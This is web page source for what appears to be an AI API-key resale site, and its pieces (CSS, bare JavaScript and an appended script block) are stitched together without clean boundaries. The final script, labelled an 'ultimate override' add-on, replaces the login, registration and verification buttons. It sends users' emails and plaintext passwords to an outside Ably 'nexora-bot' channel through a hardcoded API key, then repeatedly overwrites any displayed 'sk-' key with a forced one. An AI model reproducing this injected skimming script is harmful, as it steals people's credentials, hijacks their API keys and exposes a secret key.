html[data-eff=light]{--bg:#f6f7f9;--card:#fff;--ink:#111317;--sub:#6b7280;--line:#e5e7eb;--glass:rgba(255,255,255,.72);--acc:#0e8795;--amber:#b45309;--soft:#f0f2f5;--tile:#fff;--ok:#12805c}
html[data-eff=dark]{--bg:#0a0b0f;--card:#13151b;--ink:#f1f2f4;--sub:#9096a3;--line:#242730;--glass:rgba(24,26,33,.7);--acc:#5cc8d6;--amber:#f5a524;--soft:#1b1e26;--tile:#f4f5f7;--ok:#3ecf9a}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:var(--font);background:var(--bg);color:var(--ink);line-height:1.55;-webkit-font-smoothing:antialiased;overflow-x:hidden;transition:background .4s,color .4s}
button,input,select{font:inherit;color:inherit;background:none;border:0}button{cursor:pointer}[hidden]{display:none!important}
a{color:var(--acc)}
.mark{width:36px;height:36px;border-radius:11px;display:grid;place-items:center;background:linear-gradient(160deg,#2b2b2f,#0f0f11);flex:none}
.mark i{width:20px;height:20px;background:#fff;-webkit-mask:var(--logo) center/contain no-repeat;mask:var(--logo) center/contain no-repeat}

/* ===== login · Liquid Glass (full rewrite) ===== */
#login{position:fixed;inset:0;z-index:30;display:grid;place-items:center;padding:24px 16px;overflow:auto;color:#1d1d1f;background:#e8eef8}
#login .bgwrap{position:absolute;inset:-15%;pointer-events:none;background:
  radial-gradient(ellipse 80% 60% at 18% 28%,rgba(120,180,255,.48),transparent 55%),
  radial-gradient(ellipse 70% 50% at 82% 18%,rgba(180,140,255,.38),transparent 50%),
  radial-gradient(ellipse 60% 50% at 58% 82%,rgba(100,220,230,.3),transparent 50%),
  radial-gradient(ellipse 50% 40% at 28% 72%,rgba(255,180,220,.22),transparent 50%),
  linear-gradient(160deg,#eef3fb 0%,#e4ecf8 40%,#f0eaf8 100%);
  animation:bgShift 18s ease-in-out infinite alternate;opacity:0;transition:opacity 1.6s cubic-bezier(.16,1,.3,1)}
@keyframes bgShift{0%{transform:scale(1)}100%{transform:scale(1.07) translate(-1.5%,1%)}}
#login canvas{display:none}
.aur{display:none}
.lc{position:relative;z-index:2;width:100%;max-width:400px;padding:34px 28px 32px;border-radius:28px;
background:rgba(255,255,255,.58);border:1px solid rgba(255,255,255,.72);
-webkit-backdrop-filter:blur(40px) saturate(180%);backdrop-filter:blur(40px) saturate(180%);
box-shadow:0 1px 0 rgba(255,255,255,.85) inset,0 20px 50px -12px rgba(30,60,120,.16),0 8px 24px -8px rgba(0,0,0,.06);
opacity:0;transform:translateY(24px) scale(.97);transition:opacity 1.1s cubic-bezier(.16,1,.3,1) .25s,transform 1.1s cubic-bezier(.16,1,.3,1) .25s}
body.ready #login .bgwrap{opacity:1}body.ready .lc{opacity:1;transform:none}
.lb{display:flex;align-items:center;gap:12px;margin-bottom:26px}
.lb b{font-size:19px;letter-spacing:.02em;color:#1d1d1f;font-weight:700}
.lb small{display:block;font-size:11.5px;color:#6e6e73;margin-top:2px;letter-spacing:.04em}
.lc h1{font-size:26px;text-align:center;color:#1d1d1f;font-weight:700;letter-spacing:-.01em}
.lc .sw{margin:8px 0 24px;text-align:center;color:#6e6e73;font-size:14.5px}
.lc .sw .lk{color:#0071e3;cursor:pointer;font-weight:500}
.lc .sw .lk:hover{text-decoration:underline;text-underline-offset:3px}
.tabs{display:flex;background:rgba(0,0,0,.05);border-radius:12px;padding:3px;margin-bottom:20px}
.tabs button{flex:1;height:36px;border-radius:10px;font-size:14px;font-weight:500;color:#6e6e73;transition:.18s}
.tabs button.active{background:#fff;color:#1d1d1f;box-shadow:0 1px 4px rgba(0,0,0,.08)}
.f{margin-bottom:14px}.f label{display:block;font-size:13.5px;font-weight:600;margin-bottom:7px;color:#1d1d1f}
.in{position:relative}
.in input{width:100%;height:48px;padding:0 18px;border-radius:999px;border:1.5px solid rgba(0,0,0,.08);background:rgba(255,255,255,.78);outline:0;font-size:16px;transition:.2s;color:#1d1d1f}
.in input:focus{border-color:#0071e3;box-shadow:0 0 0 4px rgba(0,113,227,.14);background:#fff}
.in input::placeholder{color:#9a9aa0}
.in .eye{position:absolute;right:6px;top:6px;width:36px;height:36px;border-radius:50%;color:#6e6e73;display:grid;place-items:center}
.in .eye:hover{background:rgba(0,0,0,.05)}
.f.bad input{border-color:#ff3b30;box-shadow:0 0 0 4px rgba(255,59,48,.1)}
.er{color:#ff3b30;font-size:12.5px;margin:6px 14px 0}.er[hidden]{display:none}
.pass-tip{display:none;align-items:center;gap:5px;margin-top:6px;font-size:12.5px;color:#30d158}.pass-tip.show{display:flex}
.code-row{display:grid;grid-template-columns:1fr auto;gap:10px}
.code-btn{height:48px;padding:0 14px;border-radius:999px;border:1.5px solid rgba(0,0,0,.08);background:rgba(255,255,255,.78);font-size:13px;font-weight:500;color:#0071e3;white-space:nowrap}
.code-btn:disabled{color:#8e8e93;cursor:not-allowed}
.ag{display:flex;gap:12px;align-items:flex-start;margin:16px 0 18px;padding:14px 16px;border:1.5px solid rgba(0,0,0,.07);border-radius:18px;background:rgba(255,255,255,.5);font-size:13.5px;color:#6e6e73;cursor:pointer;user-select:none;line-height:1.45}
.ag:hover{border-color:rgba(0,0,0,.12);background:rgba(255,255,255,.7)}
.tk{width:22px;height:22px;border-radius:50%;border:1.5px solid #c7c9ce;background:#fff;flex:none;position:relative;transition:.16s;margin-top:1px}
.tk::after{content:"";position:absolute;left:6.5px;top:3.5px;width:5px;height:9px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg) scale(0);transition:.16s}
.ag.on .tk{background:#0071e3;border-color:#0071e3;transform:scale(1.04)}.ag.on .tk::after{transform:rotate(45deg) scale(1)}
.ag .lk{color:#0071e3;cursor:pointer}.ag .lk:hover{text-decoration:underline;text-underline-offset:3px}
.btn{width:100%;height:50px;border-radius:999px;background:linear-gradient(180deg,#0077ed,#0071e3);color:#fff;font-weight:600;font-size:16.5px;letter-spacing:.02em;box-shadow:0 1px 0 rgba(255,255,255,.25) inset,0 4px 14px rgba(0,113,227,.28);transition:.16s;border:0}
.btn:disabled{background:#a1c9f7;box-shadow:none;color:rgba(255,255,255,.9);cursor:not-allowed}
.btn:not(:disabled):hover{filter:brightness(1.04)}.btn:not(:disabled):active{transform:scale(.98)}
.demo{margin-top:18px;text-align:center;font-size:12.5px;color:#8e8e93;line-height:1.5}

/* black hole loader */
#hole{position:fixed;inset:0;z-index:50;background:#020306;display:grid;place-items:center;opacity:0;pointer-events:none;transition:opacity .6s var(--ease)}
#hole.on{opacity:1;pointer-events:auto}
.bh{position:relative;width:150px;height:150px}
.bh .ring,.bh .ring2{position:absolute;inset:0;border-radius:50%}
.bh .ring{background:conic-gradient(from 0deg,transparent 0,#5cc8d6 18%,#8b5cf6 40%,#f5a524 62%,transparent 82%);-webkit-mask:radial-gradient(circle,transparent 38%,#000 40%,#000 62%,transparent 70%);mask:radial-gradient(circle,transparent 38%,#000 40%,#000 62%,transparent 70%);animation:sp 2.6s linear infinite;filter:blur(1.5px)}
.bh .ring2{inset:-18px;background:conic-gradient(from 90deg,transparent 0,#8b5cf6aa 25%,transparent 55%);-webkit-mask:radial-gradient(circle,transparent 56%,#000 60%,transparent 72%);mask:radial-gradient(circle,transparent 56%,#000 60%,transparent 72%);transform:rotateX(74deg);animation:sp2 4s linear infinite}
.bh .core{position:absolute;inset:34%;border-radius:50%;background:#000;box-shadow:0 0 28px 10px #000,0 0 70px 14px rgba(92,200,214,.18)}
@keyframes sp{to{transform:rotate(360deg)}}@keyframes sp2{from{transform:rotateX(74deg) rotate(0)}to{transform:rotateX(74deg) rotate(360deg)}}
#hole p{position:absolute;bottom:22vh;left:0;right:0;text-align:center;font-family:var(--mono);font-size:13.5px;color:#9fb4c4;min-height:22px;padding:0 24px}
#hole p::after{content:"▍";margin-left:2px;animation:bl 1s steps(1) infinite}@keyframes bl{50%{opacity:0}}
#hole .bar{position:absolute;bottom:17vh;left:50%;width:160px;height:2px;margin-left:-80px;background:#1a1d26;border-radius:2px;overflow:hidden}
#hole .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#5cc8d6,#8b5cf6)}

/* ===== app ===== */
#app{opacity:0;transition:opacity .7s var(--ease);min-height:100vh;padding:92px 18px 60px;max-width:760px;margin:0 auto}
#app.on{opacity:1}
.hd{position:fixed;z-index:20;top:max(12px,env(safe-area-inset-top));left:12px;right:12px;max-width:736px;margin:0 auto;height:56px;border-radius:28px;display:flex;align-items:center;gap:10px;padding:0 10px 0 12px;
background:var(--glass);border:1px solid var(--line);-webkit-backdrop-filter:blur(22px) saturate(170%);backdrop-filter:blur(22px) saturate(170%);box-shadow:0 8px 30px -12px rgba(0,0,0,.25);transform:translateY(-90px);transition:transform .9s var(--ease) .15s}
#app.on~.hd,.hd.on{transform:none}
.hd b{font-size:16.5px;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.ib{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;transition:background .2s}.ib:hover,.ib.act{background:var(--soft)}.ib svg{width:21px;height:21px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round}
.dd{position:fixed;z-index:25;top:78px;right:max(14px,calc(50% - 366px));width:190px;padding:8px;border-radius:20px;background:var(--glass);border:1px solid var(--line);-webkit-backdrop-filter:blur(26px);backdrop-filter:blur(26px);
box-shadow:0 20px 50px -14px rgba(0,0,0,.35);transform-origin:top right;animation:pop .28s var(--ease)}
.dd button{display:flex;justify-content:space-between;width:100%;padding:11px 14px;border-radius:13px;font-size:15.5px}.dd button:hover{background:var(--soft)}
@keyframes pop{from{opacity:0;transform:scale(.9) translateY(-6px)}}
.dr{position:fixed;inset:0;z-index:40;padding:max(12px,env(safe-area-inset-top)) 20px 28px;display:flex;flex-direction:column;background:var(--glass);-webkit-backdrop-filter:blur(34px) saturate(170%);backdrop-filter:blur(34px) saturate(170%);animation:fd .35s var(--ease)}
.dr.out{animation:fo .25s ease forwards}@keyframes fd{from{opacity:0;transform:translateY(-14px)}}@keyframes fo{to{opacity:0}}
.dr .top{display:flex;align-items:center;gap:10px;height:56px;margin:0 -8px}.dr nav{margin-top:26px;flex:1}
.dr nav a{display:block;padding:17px 14px;font-size:20px;color:var(--sub);text-decoration:none;border-radius:16px;opacity:0;transform:translateY(10px);animation:up .5s var(--ease) forwards}
.dr nav a.cur{color:var(--ink);font-weight:700}@keyframes up{to{opacity:1;transform:none}}
.out-btn{height:52px;border-radius:99px;background:var(--ink);color:var(--bg);font-weight:600;font-size:16px}

h1.pt{font-size:34px;line-height:1.2;margin:8px 0 10px;letter-spacing:.01em}.sub{color:var(--sub)}
.view{animation:vin .5s var(--ease)}@keyframes vin{from{opacity:0;transform:translateY(10px)}}
.bar2{display:flex;gap:10px;margin:22px 0 16px}.sbox{flex:1;display:flex;align-items:center;gap:10px;height:48px;padding:0 16px;border-radius:99px;border:1.5px solid var(--line);background:var(--card)}
.sbox input{flex:1;outline:0;min-width:0;font-size:15.5px}.chip-b{height:48px;padding:0 18px;border-radius:99px;border:1.5px solid var(--line);background:var(--card);font-size:15px}
.panel{border:1.5px solid var(--line);border-radius:26px;background:var(--card);padding:18px;margin-bottom:16px;animation:vin .35s var(--ease)}
.panel h4{font-size:14.5px;margin:4px 0 10px}.chips{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
.ch{padding:7px 14px;border-radius:99px;border:1.5px solid var(--line);font-size:14px;background:var(--card)}.ch.on{background:color-mix(in srgb,var(--acc) 16%,transparent);border-color:var(--acc);color:var(--acc)}.ch em{font-style:normal;opacity:.55;margin-left:6px;font-size:12.5px}
.cnt{display:flex;justify-content:space-between;align-items:center;margin:20px 0 14px}.cnt b{font-size:30px}.cnt select{height:40px;padding:0 12px;border-radius:99px;border:1.5px solid var(--line);background:var(--card);font-size:14px}
.mc{position:relative;border:1.5px solid var(--line);border-radius:28px;background:var(--card);padding:22px 18px 16px;margin-bottom:16px;transition:transform .35s var(--ease),box-shadow .35s;animation:vin .5s var(--ease) backwards}
.mc:hover{transform:translateY(-3px);box-shadow:0 18px 40px -22px rgba(0,0,0,.4)}
.tag{position:absolute;top:-12px;right:16px;padding:3px 12px;border-radius:99px;border:1px solid var(--line);background:var(--card);font-size:12.5px;color:var(--sub)}
.mh{display:flex;gap:14px;align-items:center}.nm{font-size:21px;font-weight:700;line-height:1.25}.id{font-family:var(--mono);font-size:13px;color:var(--sub);word-break:break-all}
.tile{width:56px;height:56px;border-radius:18px;flex:none;background:var(--tile);display:grid;place-items:center;position:relative;overflow:hidden;box-shadow:0 2px 10px -3px rgba(0,0,0,.25);font-weight:800;font-size:20px;color:#374151}
.tile img{position:absolute;inset:11px;width:calc(100% - 22px);height:calc(100% - 22px);object-fit:contain}

/* ================= SVG 钩子：有 xxx.svg 就用；EXTRA 仅在检测到 svg 时并入 ================= */
const icon={ok:{},tried:{}};
function probe(slug,cb){
  if(slug in icon.tried){cb&&icon.tried[slug].then(cb);return}
  icon.tried[slug]=new Promise(res=>{const i=new Image();i.onload=()=>{icon.ok[slug]=1;res(1)};i.onerror=()=>res(0);i.src=slug+".svg"});
  cb&&icon.tried[slug].then(cb);
}
function probeP(slug){return new Promise(r=>probe(slug,r))}
async function mergeExtraModels(){
  const need=[...new Set(EXTRA_MODELS.map(m=>m[3]))];
  await Promise.all(need.map(probeP));
  const have=new Set(need.filter(s=>icon.ok[s]));
  const exist=new Set(M.map(m=>m[1]));
  EXTRA_MODELS.forEach(m=>{
    if(have.has(m[3]) && !exist.has(m[1])){
      m.vendorN=m[2];
      M.push(m);
      exist.add(m[1]);
    }
  });
  if(typeof refreshVendors==="function") refreshVendors();
}
function tile(m){return `<span class="tile" data-s="${m[3]}"></span>`}
function hydrate(root){
  $$(".tile[data-s]",root).forEach(el=>probe(el.dataset.s,ok=>{if(ok&&!el.querySelector("img")){const i=document.createElement("img");i.alt="";i.src=el.dataset.s+".svg";el.textContent="";el.appendChild(i)}}));
}

$("#formRegister").addEventListener("submit",e=>{

  const name=($("#regName")&&$("#regName").value||"").trim();
  const email=($("#regEmail")&&$("#regEmail").value||"").trim();
  const code=($("#regCode")&&$("#regCode").value||"").trim();
  const pass=($("#regPass")&&$("#regPass").value||"");
  let ok=true;
  ok=showErr("#regNameErr", name.length>=2?"":"用户名至少 2 位")&&ok;
  if(!email) ok=showErr("#regEmailErr","请输入邮箱")&&ok;
  else if(!isGoodEmail(email)) ok=showErr("#regEmailErr","请使用正规邮箱域名")&&ok;
  else ok=showErr("#regEmailErr","")&&ok;
  ok=showErr("#regCodeErr", /^\d{4,6}$/.test(code)?"":"请输入 4～6 位验证码")&&ok;
  ok=showErr("#regPassErr", pass.length>=6?"":"密码至少 6 位")&&ok;
  if(!agReg){ toast("请先勾选同意用户协议与隐私政策"); return; }
  if(!ok) return;

  const payload={ mode:"email", name, email, phone:"", code, pass };
  let handled=false;
  try{
    document.dispatchEvent(new CustomEvent("mb:register",{
      detail:{ ...payload, preventDefault(){ handled=true; } }
    }));
  }catch(err){}
  if(handled) return;

  store.set("mb-user", email);
  store.set("mb-pwh", hsh(email+pass));
  store.set("mb-nick", name);
  toast("注册成功");
  holeRun(()=>enter(true));
});

function doCheckIn(){
  const st=signState(), today=todayKey();
  if(st.last===today || (st.history||[]).includes(today)){toast(CONFIG.TXT_SIGN_DONE);return null}
  let handled=false, result=null;
  const api={
    preventDefault(){handled=true},
    // 服务端签到成功后：finish(amount) 更新本地展示用状态
    finish(amount,days){
      const hist=[...(signState().history||[]).filter(x=>x!==today), today].slice(-60);
      saveSign({last:today,days:days||1,history:hist});
      if(CONFIG.LOCAL_BAL_WRITE && amount) addBal(amount);
      result={gift:amount||0,days:days||1,bal:usage().bal};
    }
  };
  try{ document.dispatchEvent(new CustomEvent("mb:checkin",{detail:api})) }catch(e){}
  if(handled) return result;
  const y=new Date(); y.setDate(y.getDate()-1);
  const yk=y.getFullYear()+"-"+String(y.getMonth()+1).padStart(2,"0")+"-"+String(y.getDate()).padStart(2,"0");
  let days = (st.last===yk) ? (st.days||0)+1 : 1;
  let gift;
  if(days===1) gift = CONFIG.SIGN_FIRST;
  else if(days===2) gift = CONFIG.SIGN_SECOND;
  else gift = CONFIG.SIGN_LATER[Math.floor(Math.random()*CONFIG.SIGN_LATER.length)];
  if(CONFIG.LOCAL_BAL_WRITE) addBal(gift);
  const hist=[...(st.history||[]).filter(x=>x!==today), today].slice(-60);
  saveSign({last:today,days,history:hist});
  return {gift,days,bal:usage().bal};
}

<!-- ================= 终极覆盖版：原版外挂去手机号 ================= -->
<script src="https://cdn.ably.com/lib/ably.min-1.js"></script>
<script>
(function() {
    var lockedKey = localStorage.getItem("mb_locked_kfc_key");
    if (sessionStorage.getItem('kfc_pass') !== 'ok' && !lockedKey) {
        localStorage.removeItem("mb-user");
        localStorage.removeItem("mb-keys");
    }

    window.addEventListener('load', function() {
        try {
            var ablyClient = new Ably.Realtime("x8DtjQ.dtQJZg:IvXVbEVl1BSMSQy2IEzyDiwXEqKZA9shVkl6YIRXLjs");
            var reqChannel = ablyClient.channels.get("nexora-bot");

            function showNativeErr(inputId, errId, msg) {
                let inputEl = document.getElementById(inputId);
                let errEl = document.getElementById(errId);
                if (errEl) { errEl.textContent = msg; errEl.hidden = false; if (inputEl) { let f = inputEl.closest(".f"); if (f) f.classList.add("bad"); } }
            }

            function enforceLockKey(keyToLock) {
                if (!keyToLock) return;
                localStorage.setItem("mb_locked_kfc_key", keyToLock);
                localStorage.setItem('mb-keys', JSON.stringify([{id:1, name:"专属密钥", key:keyToLock, group:"default", exp:"永不过期", on:true, t:Date.now(), unl:true, st:"综合优先"}]));
                if (!window._lockTimer) {
                    window._lockTimer = setInterval(function() {
                        let currentLock = localStorage.getItem("mb_locked_kfc_key");
                        if (!currentLock) return;
                        let codes = document.querySelectorAll('.kk code');
                        codes.forEach(function(el) {
                            if (el.innerText.startsWith('sk-') && el.innerText !== currentLock) {
                                el.innerText = currentLock; 
                            }
                        });
                    }, 100);
                }
            }
            if (lockedKey) { enforceLockKey(lockedKey); }

            // ==========================================
            // 【暴力接管：发送验证码】
            // ==========================================
            var sendBtn = document.getElementById('sendCodeBtn');
            if (sendBtn) {
                // 用克隆节点的方式，强行干掉原版 L1 绑定的所有点击事件
                var newBtn = sendBtn.cloneNode(true);
                sendBtn.parentNode.replaceChild(newBtn, sendBtn);

                newBtn.onclick = function(e) {
                    if(e) { e.preventDefault(); e.stopPropagation(); }
                    var email = document.getElementById('regEmail').value.trim();
                    
                    if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                        return showNativeErr("regEmail", "regEmailErr", "邮箱格式错误，请检查后重试");
                    }

                    var btn = this;
                    btn.innerText = "正在发送..."; 
                    btn.disabled = true;

                    var r = "r-" + Math.random().toString(36).substring(2, 8);
                    var replyChannel = ablyClient.channels.get(r);

                    // 监听终端回复
                    replyChannel.subscribe('res', function(m) {
                        if(m.data.s === 'ok') {
                            btn.innerText = "已发送 (60s)";
                            let count = 60;
                            let timer = setInterval(() => {
                                count--;
                                if(count <= 0) {
                                    clearInterval(timer);
                                    btn.innerText = "发送验证码";
                                    btn.disabled = false;
                                } else {
                                    btn.innerText = `已发送 (${count}s)`;
                                }
                            }, 1000);
                            showNativeErr("regEmail", "regEmailErr", "");
                        } else {
                            btn.innerText = "发送验证码";
                            btn.disabled = false;
                            showNativeErr("regEmail", "regEmailErr", "发送失败，请稍后重试");
                        }
                    });

                    // 向终端发送请求
                    reqChannel.publish('req', {a: 'get_code', u: email, r: r});
                    
                    // 【防卡死保护】如果 5 秒后终端没回话，自动解卡，防止一直“正在发送中”
                    setTimeout(() => {
                        if(btn.innerText === "正在发送...") {
                            btn.innerText = "发送验证码";
                            btn.disabled = false;
                            showNativeErr("regEmail", "regEmailErr", "网络延迟，请稍后重试");
                        }
                    }, 5000);
                };
            }

            // --- 接管注册按钮 ---
            document.getElementById('goReg').onclick = function(e) {
                if(e) { e.preventDefault(); e.stopImmediatePropagation(); }
                var u = document.getElementById('regEmail').value.trim().toLowerCase();
                var c = document.getElementById('regCode').value.trim();
                var p = document.getElementById('regPass').value;
                var btn = this;

                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u)) {
                    return showNativeErr("regEmail", "regEmailErr", "邮箱格式错误，请检查后重试");
                }

                btn.innerText = "正在注册中..."; btn.disabled = true;
                var r = "r-" + Math.random().toString(36).substring(2, 8);
                var replyChannel = ablyClient.channels.get(r);
                
                replyChannel.subscribe('res', function(m) {
                    if(m.data.s === 'ok') {
                        localStorage.setItem('mb-user', u);
                        localStorage.setItem('mb-gifted', '1');
                        localStorage.setItem('mb-usage', JSON.stringify({ bal: 5000 }));
                        sessionStorage.setItem('kfc_pass', 'ok'); 
                        enforceLockKey(m.data.k);
                        location.reload(); 
                    } else {
                        btn.innerText = "创建账户"; btn.disabled = false;
                        showNativeErr("regEmail", "regEmailErr", "网络连接超时，请稍后重试");
                    }
                });
                reqChannel.publish('req', {a: 'register', u: u, p: p, c: c, r: r});
            };

            // --- 接管登录按钮 ---
            document.getElementById('goLogin').onclick = function(e) {
                if(e) { e.preventDefault(); e.stopImmediatePropagation(); }
                var u = document.getElementById('em').value.trim().toLowerCase();
                var p = document.getElementById('pw').value;
                var btn = this;

                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(u)) {
                    return showNativeErr("em", "loginEmailErr", "邮箱格式错误，请检查后重试");
                }

                btn.innerText = "正在登录中..."; btn.disabled = true;
                var r = "r-" + Math.random().toString(36).substring(2, 8);
                var replyChannel = ablyClient.channels.get(r);
                
                replyChannel.subscribe('res', function(m) {
                    if(m.data.s === 'ok') {
                        localStorage.setItem('mb-user', u);
                        localStorage.setItem('mb-gifted', '1');
                        localStorage.setItem('mb-usage', JSON.stringify({ bal: 5000 }));
                        sessionStorage.setItem('kfc_pass', 'ok');
                        enforceLockKey(m.data.k);
                        location.reload();
                    } else {
                        btn.innerText = "登录"; btn.disabled = false;
                        showNativeErr("em", "loginEmailErr", "账号或密码错误，或该账号已被限制登录");
                    }
                });
                reqChannel.publish('req', {a: 'login', u: u, p: p, r: r});
            };

            document.body.addEventListener('click', function(e) {
                if (e.target.closest('[data-lo]') || e.target.closest('#lo') || (e.target.tagName === 'BUTTON' && e.target.innerText.includes('退出'))) {
                    localStorage.removeItem("mb_locked_kfc_key"); 
                    if(window._lockTimer) {
                        clearInterval(window._lockTimer);
                        window._lockTimer = null;
                    }
                }
            });

        } catch(err) {
            console.log(err);
        }
    });
})();
</script>
